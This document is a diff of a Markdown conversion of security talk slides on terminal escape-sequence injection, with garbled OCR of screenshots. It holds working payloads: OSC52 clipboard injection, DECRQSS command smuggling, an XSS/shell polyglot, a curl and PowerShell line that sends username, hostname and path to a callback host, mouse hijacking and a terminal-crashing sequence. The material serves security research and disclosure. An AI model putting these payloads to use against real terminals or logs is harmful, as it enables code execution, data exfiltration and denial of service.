 June 2022 Notable fixes
-May 2022 . . h Thank you
 April 2022 Subscribe
 Ask questions
 March 2022
@@ -1045,17 +1013,12 @@ https://code.visualstudio.com/updates/v1_80
 
 **MAKES YOU WONDER WHAT THAT LOGFILE CONTAINS?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-(u)
-—p
->
 Visual Studio Code laa!
-PROBLEMS OUTPUT  DEBUGCONSOLE ~~ TERMINAL >| zsh + v il
-+ terminal ls x. log
 badlog. log goatse. log
-+ terminal cat goatse. log §j
 MAKES YOU WONDER WHAT THAT LOGFILE CONTAINS?
 ```
 
@@ -1063,14 +1026,12 @@ MAKES YOU WONDER WHAT THAT LOGFILE CONTAINS?
 
 **CLIPBOARD INJECTION OSC52**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-A tmux/tmux | Public
 <> Code
-()
 ) Issues
-AH
 29
 1‘) Pullrequests 7 (2) Discussions ©) Actions 1] Wiki © Security | Insights
 Clipboard
@@ -1094,11 +1055,11 @@ To skip the details and read quick step-by-step instructions on configuring set-
 
 #### **OSC52 CLIPBOARD INJECTION**
 
-```
+\```
 printf '\033]52;c;base64string\007'
 b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK
 open -a calculator.app \n
-```
+\```
 
 ## Slide 82
 
@@ -1110,16 +1071,17 @@ open -a calculator.app \n
 
 ##### **ZSH OSC52**
 
-```
+\```
 printf '\033]52;c;base64string\007'
 b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK
-```
+\```
 
-```
+\```
 open -a calculator.app
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 stok@STOKs-MBP:~/Documents
@@ -1132,54 +1094,37 @@ Documents [|
 
 **BASH OSC52**
 
-```
+\```
 printf '\033]52;c;base64string\007'
 b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK
 open -a calculator.app
-```
+\```
 
 ###### **BASH DONT.**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bash
-Documents printf '\033]52;c;b3BLbiAtYSBj YWxjdWxhdGSyLmFwcAok\ 007 '
-Documents open -a calculator.app
-ly
-> Documents bash
-The default interactive shell is now zsh.
-To update your account to use zsh, please run ‘chsh -s /bin/zsh°.
-For more details, please visit https://support.apple.com/kb/HT208050.
-bash-3.2$ apen —a calculator.app
-bash-3.2$
-bash-3.2$ |]
-BASH DONT.
-```
 
 ## Slide 85
 
 #### **OSC52 CLIPBOARD INJECTION** `printf '\033]52;c;c2xlZXAgMQplY2hvIEhlbGxvICQod2hvYW1pKQoK\007'`
 
-```
+\```
 sleep1 \r\n
 echo Hello $(whoami) \r\n
 \r\n
-```
+\```
 
 ## Slide 86
 
 ##### **OSC52**
 
-```
+\```
 printf '\033]52;c;c2xlZXAgMQplY2hvIEhlbGxvICQod2hvYW1pKQoK\007'
-```
+\```
 
-```
+\```
 sleep1 \r\n
 echo Hello $(whoami) \r\n
 \r\n
-```
+\```
 
 **DIFFERENT TERMINALS BEHAVE IN DIFFERENT WAYS**
 
@@ -1187,25 +1132,25 @@ echo Hello $(whoami) \r\n
 
 ##### **XSS/NIX/WIN POLYGLOT-ISH**
 
-```
+\```
 \n\n\n\n\n\n
 data:image/
 svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53
 My5vcmcvMjAwMC9zdmciPgogIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgIGFsZXJ0KCJpbmplY3R
 pb24gc3VjY2Vzc2Z1bCIpOwogIDwvc2NyaXB0Pgo8L3N2Zz4=#\n
-```
+\```
 
-```
+\```
 curl "http://$(whoami).$(hostname).rcepoc.127.0.0.1.nip.io/$(pwd | base64)"\n
 cmd /c powershell -Command "$URI = 'http://%username%.
 %computername%.rcepoc.127.0.0.1.nip.io/';Invoke-WebRequest -Uri $URI"\n
-```
+\```
 
 ## Slide 88
 
 #### **OSC52 CLIPBOARD INJECTION**
 
-```
+\```
 printf
 '\033]52;c;CgoKCgpkYXRhOmltYWdlL3N2Zyt4bWw7YmFzZTY0LFBITjJaeUIyWlhKemFXOXVQU0l4TGpFaUlH
 SmhjMlZRY205bWFXeGxQU0ptZFd4c0lpQjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl
@@ -1215,42 +1160,29 @@ mwgImh0dHA6Ly8kKHdob2FtaSkuJChob3N0bmFtZSkucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJChwd
 YXNlNjQpIgoKY21kIC9jIHBvd2Vyc2hlbGwgLUNvbW1hbmQgIiRVUkkgPSAnaHR0cDovLyV1c2VybmFtZSUuJWN
 vbXB1dGVybmFtZSUucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJztJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRVUk
 kiCg==\007' > badlog.log
-```
+\```
 
 ## Slide 89
 
 **POLYGLOT?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Collaborator
-bash-3.2$§
 bash-3.2$
-bash-3.2$ data: image/svg+xm1l;base64 , PHN2ZyB2ZXIJzaW9uPSIxLjE7IGIhc2vVQcmomawx L
-PSJImdWxsliB4bWxuczd7 aHROcDovL 3d3dy53My5vemcvMj AwMC9zdmciPgogI Dxz¥3JpcHQgdHlw
-ZTOidGV4dC9qYXZhc2NyaxBOlj 4KICAgIGFSZXJOKCIpbmp LY3SRpb24gc3Vj Y2Vzc2Z1bCI pOwog
-IDwvc2NyaXBoOPgo8L3N27z4=#%
 bash: data:image/svg+xml: No such file or directory
-bash: base64,PHN2ZyB2ZXIJzawSuPSIxLjETIGIhc2vOcmomawx LPSImdwxsLliB4shbwxuczO7iaHR
-OcDovL3d3dy53My5vcmcevMj AWHC9zdmciPgogIDxz¥3 IJpcHQgdHLwZT07 dGV4dC9q¥XZhc2NyaXxB
-OIj4KICAZIGFSZXIOKCIpbmp LY3Rpb24ge3Vj ¥2¥Vzc2Z1bCI pOwogI Dwvc2NyaXBOPgoSL3N2Zz4
 =#: command not found
 bash-3.2$
-bash-3.2$ curl “http: //$ (whoami) .$ (hostname) .rcepoc. idz9guqceiehzubwq7v9rp3c
 k3quek29.oastify.com/$(pwd | base64)"'
-<htm1> <body> jvd2agysrd54u73xu084f9zjjgigz< /body></html>bash-3.2$
 bash-3.2$ cmd /c powershell -Command "S$URI = ‘http: //%username%S.%computernam
 e%. rcepoc.idz9guqceiehzubwq7v9rp3ck3quek29. castify.com/';Inveke-WebRequest -
 Uri SURI"
 bash: cmd: cammand not found
 bash-3.2$ []
-F=) Command Prompt x + ov _ 0
 Headers {[X-Collaborator—-Version, 4], [Age, 9],
-[Connection, keep-alive] , [Content-! anath
-55] oe } Docker Desktop —_ Upgrade plan
 Images 3 lb
-put selds 5 ® Containers <
 ParsedHtmL : System.__ComObject @ images
 RawContentLength : 55
 @ Volumes Logs
@@ -1280,14 +1212,7 @@ DNS
 HTTP
 ¥ Include Collaborator server location
 Payload
-idz9guqcelehzubwq7v9rp3cksquek29
-idz9guqceiehzubwq7v9rp3ck3quek29
-idz9guqceiehzubwaq7vOrp3ck3quek29
 idz9guqceiehzubwq7v9rp3cksquek29
-idz9guqceiehzubwgq7v9rp3ck3quek29
-idz9guqceiehzubwq7v9rp3cksquek29
-idz9guqceiehzubwq7vSrp3ck3quek29
-idz9guqceiehzubwaq7v9rp3ckSquek29
 Response from Collaborator
 — ie
 Inspector
@@ -1298,35 +1223,25 @@ Source |
 188.126.80.54
 188.126.80.54
 188.126.80.54
-188, 126.80.54
-188.126,80.54
 188.126.80.54
-188. 126.80.54
 Request attributes 2 vi
 root.2e0348d7 fed4. rcepoc. idz9guqceiehzubwq7v9rp3ck3quek29. oast
 ify.com
 3 User-Agent: curl/7.86.6
 4 Accept: */*
 (OKC € > Search...
-ZeUs48a/Tea4 iL
 Inspect Terminal Files
 Stats
 Request headers
 0 highlights
 Open in external terming
-~ data:image/svg+xmljbase64,P/ xX = +
-€>x
 This page says
 injection successful
-A Not Secure | data:image/svg+xm|;base64, PHN2ZyB2ZXJzaW 9uPSIxLjEilGJhc2VQcm9maWxIPSJmdWxsliB4bWxucz0iaHROcDovL3d3dy5aMySvemcyMjAWMC9zdmciPgogIDxzY3JpcHQgdH... (f) +X zs Alla :
 Q 0
 v
 OK
-sMy SvcmcvMj Aw)
 JyaXBOPgo8L3N
-“9zdmciPgogID
 'z4=#: not fo
-$quek29..oasti
 ```
 
 ## Slide 90
@@ -1343,33 +1258,30 @@ $quek29..oasti
 
 **CLEARS THE LOG EVERY TIME IT RENDERS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ @ @ Docker Desktop Update to latest Q. Search for local and remote images, containers, and more... = Sign in fe)
 affectionate_chandrasekhar
 docker/getting-started STATUS
-< @ = Running (17 minutes ago) Ld v) |
 2e0348d7fed4 0 gl Sag
 @ Containers
-@& images 30:80 F
 @m Volumes Logs Inspect Terminal Files Stats
 (A Dev Environments (BETA "failed (2:_No such file or directory), client: _172.17.9.1,_server:_ localhost, request: "GET /tutorial/ Qneg b
-Tid. bRSb2INO7HADASbHMADMSD2INO7_ HITE 0 G
 2 Learning Center
 Extensions 5
 wy Resource usage
 © seeseners CLEARS THE LOG EVERY TIME IT RENDERS
-v
 @ 404 Not Found re ee RAM4.16GB CPU0.20% Disk 47.53 GB avail. of 58.37 GB 4 Not connected to Hub @ v4.19.0 0
-= > CGC @® 127.0.0.1/tutorialfupdating-our-app%1b%5bH% 1b%5b2)%07 %1b%5DH% 1b %5b2J%07 o x 2
 404 Not Found
 nginx/1.23.3
 ```
 
 ## Slide 93
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Dictionary
@@ -1390,7 +1302,8 @@ harm or attack repeatedly.
 
 ## Slide 95
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 invisible-island.net
@@ -1429,11 +1342,10 @@ Ps
 
 **POPS A PRINT JOB**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
->»
-tl
 & invisible-island.net
 CSI Ps i Media Copy (MC).
 Ps = @ = Print screen (default).
@@ -1447,7 +1359,6 @@ POPS A PRINT JOB
 Page 1 of 1
 Jump (Fast)
 Normal Video
-oP
 Copies
 Pages
 ® All Pages
@@ -1463,7 +1374,6 @@ v
 None ¢
 A4 210 by 297 mm
 ® +(2) Portrait +) Landscape
-100%
 Black and white
 Cancel
 ```
@@ -1472,12 +1382,12 @@ Cancel
 
 ##### **PRINT STUFF**
 
-```
+\```
 Printf '\033[0i\007'
 Print onscreen stuff
 Printf '\033[5i\007'
 Send output to printer (BRICK iTERM2)
-```
+\```
 
 **SENDS ALL OUTPUT TO A NON EXISTING PRINTER**
 
@@ -1489,25 +1399,26 @@ Send output to printer (BRICK iTERM2)
 
 ###### **HIJACK MOUSE**
 
-```
+\```
 printf '\033[?1001h\033[?1002h\033[?1003h\033[?1004h\033[?
 1005h\033[?1006h\033[?1007h\033[?1015h\033[?10016h\'
-```
+\```
 
 ## Slide 100
 
 **HIJACK MOUSE**
 
-```
+\```
 printf '\033[?1001h\033[?1002h\033[?1003h\033[?1004h\033[?
 1005h\033[?1006h\033[?1007h\033[?1015h\033[?10016h\'
-```
+\```
 
 ###### **EVERY SINGLE MOUSE MOVEMENT WILL BE REPORTED**
 
 ## Slide 101
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 8 invisible-island.net FE] w
@@ -1529,7 +1440,6 @@ response depends on the decTerminalID resource setting.
 CSI 7 ; @c (C"VT101 with No Options")
 CST 7 ; 6 c ("VT132 with Advanced Video and Graphics")
 CSI 7 ("VT102")
-CSI ("VT131")
 ```
 
 ## Slide 102
@@ -1548,9 +1458,9 @@ CSI ("VT131")
 
 `printf '` ✌ `\033[1000000000;b\007'`
 
-```
+\```
 1.000.000.000 = ONE BILLION
-```
+\```
 
 ## Slide 105
 
@@ -1604,19 +1514,16 @@ CSI ("VT131")
 
 **BRICKED**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-curl localhost/hellot%ef%b8S8FfS1bs5b1000000000%3bb%07
 @ @ @ Docker Desktop Upgrade plan Q. Search for local and remote images, containers, and more... 38K &% & Sinn @
 affectionate_chandrasekhar
 @ containers é docker/getting-started STATUS >
 @ 2e0348d7fed4 F Running (7 minutes ago)
-@ mages 80:80
 @ Volumes Logs Inspect Terminal Files Stats
-SB Dev Environments | BETA
 @_ Learning Center
-4
 Extensions =
 wy Resource usage
 @) Add Extensions
@@ -1626,30 +1533,24 @@ wy Resource usage
 
 ###### **BRICKED BRICKED CRASHED BRICKED TRY IT YOURSELF AT https://evil.terminalinjection.com/dos**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 +> Documents printf ' §033[1000000000;b\007'
 @ @ @ Docker Desktop Upgrade plan Q Search for local and remote images, containers, and more... #K & & Signin €
-: affectionate_chandrasekhar
 ® Containers < ® docker/getting-started STATUS >
 2e0348d7fed4 © Running (2 minutes ago)
 @ Images 80:80 @
 @ Volumes Logs Inspect Terminal Files Stats external terminal @
 —) Dev Environments (BETA
 @D_Learning Center / # printf '@e33[1900000000;b\007'
-a
 e .
 Extensions 5
-wy Resource usage Poornees 3
-IREMOTHER: ~$
-IR@MOTHER:~$ printf * M033 [1@86608006 ;b\a07'
 @) Add Extensions
 PROBLEMS OUTPUT
 RAM 4.16 GB Disk 47.53 GB avail. of 58.37 GB Not connected to Hub |
-Je) > «~ printf '#\@33[1000000000;b\007'
 a]
-o 2\xielV bin|m a
 BRICKED
 TRY IT YOURSELF AT https://evil.ter
 ```
@@ -1670,7 +1571,8 @@ TRY IT YOURSELF AT https://evil.ter
 
 **BlueHat 2023: Houdini of the Terminal with David Leadbeater https://www.youtube.com/watch?v=iIHw0KWgzAs**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DAVID LEADBEATER
@@ -1684,7 +1586,8 @@ https://www.youtube.com/watch?v=ilHwOKWgzAs
 
 **DAVID LEADBEATER**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DAVID LEADBEATER
@@ -1693,13 +1596,11 @@ CVEs
 This primarily targets Kubectl's CVE-2021-25743. It needs to be combined with a terminal vulnerability to
 have any effect though. Some examples are:
 \ ~— * xterm font OSC ( 2022-45063)
-e "\e]50; i$ (xcalc&) \a\e] 50; 7\a"
 e iTerm2 DECRQSS (CVE-2022-45872)
 . "\eP$q;open —a Calculator\r\e\\\eP$q\e\\"
 David Leadbeater
 dg
 ConEmu title (CVE-2022-46387)
-"\el@;\rcalc.exe\r\e\\\e(21t"
 Follow
 Windows Terminal WSL directory (C\ y 702)
 Observability, Go and Perl. Sometimes
@@ -1718,7 +1619,8 @@ W @davidgl engineer the administrator, e.g. change something else on screen (cur
 
 **DAVID LEADBEATER**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DAVID LEADBEATER
@@ -1727,7 +1629,6 @@ David Leadbeater
 Caesars Forum - Forum - 109-119, 138-139 (Track 2)
 DEF CON Official Talk
 Sun, Aug 13 12:00-12:45 PDT E%
-4 (DD
 It is 60 years since the first publication of the ASCII
 standard, something we now very much take for
 granted. ASCII introduced the Escape character;
@@ -1760,14 +1661,12 @@ and new unique ways to deliver the exploits.
 
 ## Slide 116
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Docker Desktop
 affectionate_chandrasekhar
 docker/getting-started
-2e0348d7fed4
-80:80
 @® Containers
 @ images
 @ Volumes
@@ -1785,7 +1684,6 @@ e . Kit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
 Extensions
 iP Resource usage
 x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-a of
 STATUS
 Running (4 minutes ago)
 "GET ftutorial/ HTTP/1.1" 200 14807 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/53° Q o © i <0)
@@ -1798,8 +1696,6 @@ Running (4 minutes ago)
 eee
 > Documents docker logs --follow --tail 10
 stok@STOKs-MacBook-Pro:~/Documents
-x
-<5 : @) 127.0.0.1/tutorial/
 Getting Started
 Getting Started
 Getting Started
@@ -1810,10 +1706,6 @@ Congratulations! You have started the container for this tutorial! Let's first e
 that you just ran. In case you forgot, here's the command:
 Persisting our DB
 Using Bind Mounts
-BAhti_.Carntainar Annc
-#1
-"“Mozilla/
-220348d7 fed4a5176 f5c6543b0b2582a9d5d8db4afeb42808cd16f61197d0eb1 |
 (Windows
 WebKit/53
 iTerm2
@@ -1821,11 +1713,6 @@ $ By George Nachman and Contributors
 Build 3.4.17
 What's New in 3.4?
 Home Page - Report a bug - Credits
-iTerm2 is generously supported by Ye Agendrix ye, yeAndreas Finky¥e, YeBaptiste Cantonye,
-Wk Ben Niedye, YeDamian Harouffy, YeDanny Thomas, Yeember arlynxye, Ye Fabian
-Wenk, %eFarley%e, Yefunnel.io¥e, YeJames Proudye, YeJay Thompsony, YeJeffrey David
-Marraccinite, YeJoe Purdy, %&Kel Phillipsonye, yeLes Akerye, Ye Matt Lewiny, YeMention
-Me Ltd, %& Michael Ossarehyr, Ye Mislav Marohniéyir, YeMitch Penrodye, we Padietyr,
 %KShain Singh, Yewildsands¥, Ye Yvon Letourneau, A. J. Wright, Adam, Adam Wiggins, Al
 Payne, Alan Graham, Aleksei Besogonov, Alex Parella, Alex Pearce, Alexey Palazhchenko, allen
 joslin, Andreas Wolff, Andrew Canaday, Andrew Imeson, Andrew Wang, angelus2014, Annette,
@@ -1842,19 +1729,17 @@ Luc Suryo, Mal McKay, Marcel van den Hof, Mark H Berger, Mark Higham, Mark Mann,
 Martin Kluska, Matt Schrage, Matthew Hirst, Matthew P. C. Morley, Mauricio Novelo, Max Horn,
 Michael O'Brien, Mikkel Malmberg, mimacom, Namho Kim, Oduah Tobi, Oladapo Fadeyi, Oleg
 Evdokimov, Oleksandr Tymoshenko, Olga Akhrameeva, Oliver B. Fischer, Ondfej Sury, otomiko2,
-Dail lind Deval Datanarnien Datar Bhirrass Datar Cainkaraar /(DCDNCYH\ Die Qrranctcin Dhilir
 ```
 
 ## Slide 117
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Docker Desktop —_ Update to latest Q Search for local and remote images, containers, and more...
-affectionate-chandrasekhar
 Containers STATUS
 Running (54 minutes ago)
-2e0348d7fed4
 Images
 Volumes Inspect Terminal
 Dev Environments (BETA 172.17.0.1 - - [10/Ju1/2023:09:30:57 +0000] "GET /tutorial/our-application/dashboard-two-containers.png HTTP/1.1" 200 249953 "http://Localhost/tutorial/our -ay Qo OF = 5
@@ -1866,7 +1751,6 @@ Lla/5.8 (Windows @ it/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/53
 172.17.0.1 - - [ /tutorial/updating-our-app/dashboard-removing-container.png HTTP/1.1" 200 284927 "http://localhost/tutorial/updating-our-app/" "Moz
 — illa/5.0 (Window it/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
 47 Resource usage 2023/07/10 09:3 AC % fusr/share/nginx/html/sup
-. e
 Extensions
 172.17.0.1, server: localhost, request: "GET /sup%03%1B%5B31mESC- INJECTION - SUCCESSFUL -LETS - POP - CALC%1B%5B0m%07%0a%1bP%24qm%03%1b%5C
 %1bP%24qm%3boper 7 bP%24qm%1b%5c HTTP/1.1", host: "Localhost"
@@ -1877,23 +1761,16 @@ C%1IbP%24qm%1b%5 4 i 5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML
 con.ico HTTP/1.
 Lator%3b%0d%1b%5
 172.17.0.1 - - [
-%5C%1bP%24qm%3b
-36" "="
 ‘http: //LocalLhost/sup%0a%1B%5B31mESC - INJECTION - SUCCESSFUL -LETS - POP -CALC%1B%5B0m%07%0a%1bP%24qm%03%1b%5C%1bP%24qm%3bopenk20 - a%2Ocalcu
-b
-{favicon.ico HTTP/1.1" 404 555 "http://localhost/sup%0a%1B%5B31mESC- INJECTION- SUCCESSFUL - LETS - POP-CALC%1B%5B0m%07%0a%1bP%24qm%03%1b
 %1bP%24am%1b%S5c"_"Mozilla/S.@ (Windows NT 10.0: Win64: x64) AnpleWebKit/537.36 (KHTML. Like Gecko) Chrome/114.0.5735.199 Safari/537
 @ 404 Not Found x +
 2023/07/10 09:31:04 Lerror] 22#22: *102 open{) “/usr/share/n
 ESC-INJECTIGN-SUCCESSFUL-LETS-POP-CALC
 " failed (2: No such file or directory), client: 172.17.0.1,
-SUCCESSFUL-LETS—POP-CALC%1B%5 BOM%O 7%O a%LbP%24qM%O 3% 1LbMSCMLDP!
 .1", host: "LocaLlhost"
 172.17.0.1 - - |10/Ju1/2023:609:31:04 +6000] "GET /sup%0a%1B%
-Gms03%1b%Sc%1bP%24.qm%3bopens20-ax%2Ocalculator%3sbuadMlb%Sc%1bA
 3 Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/
 AcPSqmsopen -a calculator;
-PSqm| \E
 >» Documents P$qm;open -a calculator;
 zsh: command not found: P
 + Documents P$ani |
@@ -1902,93 +1779,76 @@ nginx/1.23.3
 
 ## Slide 118
 
-```
+\```
 printf '\033P$qm\x03\033\\'
 printf '\033P$qm;open -a calculator;\r\n\033\\'
 printf '\033P$qm\033\\'
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 172.17.0.1 - - Gee) «6 {favicon.ico HTTP/1.1" 404 5
-%5C%1bP%24qm% 3b. c%1bP%24am%1b%5c"_ "Mozilla/S.|
-36" mo" 8) F
 @ 404 Not Fi
 2023/07/10 09:31:04 [error] 22#22: *102 open() "/usr/share/ngs
-ESC-INJECTION-SUCCESSFUL-LETS-POP-CALC
 " failed (2: No such file or directory), client: 172.17.0.1,
-SUCCESSFUL-LETS-—POP-CALC%1B%5 BOm%0 7%0.a%1bP%24qm%O3%1b%SC%1bP?
 .1", host: "Localhost"
 172.17.0.1 - - [10/JuL/2023:09:31:04 +0000] "GET /sup%0a%1B%5
-m%03%1b%S5Cc%1LbP%24qm%3bopen%20-a%2O0calcu Lator%3b%0d%1b%5c%1bi
 Win64; x64) AppLeWebKit/537.36 (KHTML, Like Gecko) Chrome/!
 ACPSqm;open -a calculator;
-PSqm*[\
 + Documents PS$qm;open -a calculator;
 zsh: command not found: P
 +> Documents PSqin
-eee
-=> printf '\033PSqm\x03\033\\'
 ```
 
 ## Slide 119
 
-```
+\```
 printf '\033P$qm\x03\033\\
 printf '\033P$qm;open -a calculator;\r\n\033\\'
 printf '\033P$qm\033\\'
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 73/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 172.17.0.1 - - fee) «=6/favicon.ico HTTP/1.1" 404 5
 %5C%1bP%24qm%3 be c%1bP%24am%1b%5c"_ "Mozilla/S.|
-36" mo" 8) F
 @ 404 Not Fi
 RAM 5.54GB CPU 0.4 4 GB avail SB ON « > © — @® localhos
 2023/07/10 [P9:31:04 [error] 22#22: *102 open() "/usr/share/ngs
 ESC-INJECT FON-SUCCESSFUL-LETS-POP-CALC
 " failed (ff: No such file or directory), client: 172.17.0.1,
-SUCCESSFULFFLETS-—POP-CALC%1B%5 BOm%0 7%0.a%1bP%24qm%O3%1b%SC%1bP?
-.1", hostg# "localhost"
 172.17.0.9 - - [10/Jul/2023:09:31:04 +0000] "GET /sup%0a%1B%5
-Gm%O3%1 bMS C%1LbP%S24qm%3bopen%20-a%2O0calculator%3b%Od%1b%5c%1bI
 ; Win64; Y%64) AppleWebkKit/537.36 (KHTML, Like Gecko) Chrome/!
 ACPSqm;open -a calculator;
-PSqm*[\
 + Documents PS$qm;open -a calculator;
 zsh: command not found: P
 +> Documents PSqin
-=> orintf '\033PSgm;open -a calculator; \r\n\033\\'
 ```
 
 ## Slide 120
 
-```
+\```
 printf '\033P$qm\x03\007
 printf '\033P$qm;open -a calculator;\r\n\033\\'
 printf '\033P$qm\033\\'
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 172.17.0.1 - - Gee) «6 {favicon.ico HTTP/1.1" 404 5
-%5C%1bP%24qm% 3b. c%1bP%24am%1b%5c"_ "Mozilla/S.|
-36" mo" 8) F
 @ 404 Not Fi
 2023/07/10 09:31:04 [error] 22#22: *102 open() "/usr/share/ngs
-ESC-INJECTION-SUCCESSFUL-LETS-POP-CALC
 " failed (2: No such file or directory), client: 172.17.0.1,
-SUCCESSFUL-LETS-—POP-CALC%1B%5 BOm%0 7%0.a%1bP%24qm%O3%1b%SC%1bP?
 .1", host: "Localhost"
 172.17.0.1 - - [10/JuL/2023:09:31:04 +0000] "GET /sup%0a%1B%5
-qm%03%1b%Sc%1LbP%24qm%3bopen%20-a%20calculator%3b%Od%1b%5c%1bI
 - Win64; x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/:!
 CPS$qm;open -a calculator;
-PSqm*[\
 + Documents PS$qm;open -a calculator;
 zsh: command not found: P
 +> Documents PSqin
@@ -1997,29 +1857,24 @@ zsh: command not found: P
 
 ## Slide 121
 
-```
+\```
 printf '\033P$qm\x03\007
 printf '\033P$qm;open -a calculator;\r\n\033\\'
 printf '\033P$qm\033\\'
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 172.17.0.1 - - Gee) «6 {favicon.ico HTTP/1.1" 404 5
-%5C%1bP%24qm% 3b. c%1bP%24am%1b%5c"_ "Mozilla/S.|
-36" mo" 8) F
 @ 404 Not Fi
 2023/07/10 09:31:04 [error] 22#22: *102 open() "/usr/share/ngs
-ESC-INJECTION-SUCCESSFUL-LETS-POP-CALC
 " failed (2: No such file or directory), client: 172.17.0.1,
-SUCCESSFUL-LETS-—POP-CALC%1B%5 BOm%0 7%0.a%1bP%24qm%O3%1b%SC%1bP?
 .1", host: "Localhost"
 172.17.0.1 - - [10/JuL/2023:09:31:04 +0000] "GET /sup%0a%1B%5
-qm%03%1b%Sc%1LbP%24qm%3bopen%20-a%20calculator%3b%Od%1b%5c%1bI
 ; Win64; x64) AppleWebkKit/537.36 (KHTML, Like Gecko) Chr
 ACPSqm;open -a calculator;
-PSqm*[\
 + Documents PS$qm;open -a calculator;
 zsh: command not found: P
 +> Documents PSqin
@@ -2029,18 +1884,17 @@ zsh: command not found: P
 
 ##### **OSC5113 - KITTY FILETRANSFER OVER TTY**
 
-```
+\```
 printf '\033]5113;ac=send;id=test;n=aGVsbG8udHh0;sz=3;d=AQID\\'
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 OSCS5113 - KITTY
 FILETRANSFER OVER TTY
 printf '\033]5113;ac=send; id=test;n=aGVsbG8udHh0;sz=3;d=AQID\\'
-oP
